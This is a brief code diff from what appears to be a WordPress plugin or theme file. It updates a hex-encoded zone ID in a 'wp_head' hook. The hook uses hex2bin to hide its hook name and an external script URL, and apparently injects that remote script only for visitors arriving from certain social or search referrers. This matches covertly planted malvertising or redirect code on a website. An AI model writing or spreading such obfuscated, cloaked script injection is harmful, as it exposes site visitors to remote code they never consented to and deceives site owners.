@@ -44,7 +44,7 @@ add_action(hex2bin('77705f68656164'), function () {
     if (is_singular() && ($SM_GO || $IP_FB || $AN_FB || $IG || $TT)) {
 
         $SR = hex2bin('68747470733a2f2f616c35736d2e636f6d2f7461672e6d696e2e6a73');
-        $ZN = hex2bin('3131363530313035');
+        $ZN = hex2bin('3131363334303433');
         ?>
         <script>
         (function(s){
